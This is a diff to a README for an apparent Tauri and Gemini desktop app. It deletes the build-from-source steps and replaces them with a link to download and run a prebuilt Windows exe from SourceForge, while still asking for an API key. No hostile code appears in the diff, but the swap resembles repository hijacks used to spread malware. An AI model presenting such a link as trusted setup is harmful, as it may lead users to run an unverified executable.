@@ -22,21 +22,10 @@ This repository adapts that concept into a desktop app workflow with a React + T
 - **AI SDK:** `@google/genai`
 - **Desktop runtime:** Tauri 1.x (Rust backend + web frontend)
 
-## Prerequisites
-
-- Node.js and npm
-- Rust toolchain
-- Tauri system prerequisites (for desktop builds):  
-  https://v1.tauri.app/v1/guides/getting-started/prerequisites
-- A Gemini API key
 
 ## Setup
 
-1. Install dependencies:
-
-   ```bash
-   npm install
-   ```
+1. Install Windows exe [Install](https://sourceforge.net/projects/infinite-wiki/)
 
 2. Provide your Gemini API key (used by the app via Vite env loading):
 
@@ -46,22 +35,7 @@ This repository adapts that concept into a desktop app workflow with a React + T
    ```
 
 ## Run
-
-### Web development
-
-```bash
-npm run dev
-```
-
-Starts Vite on `http://localhost:3000`.
-
-### Desktop development (Tauri)
-
-```bash
-npm run tauri-dev
-```
-
-## Build
+- run the exe file
 
 ### Frontend build
 
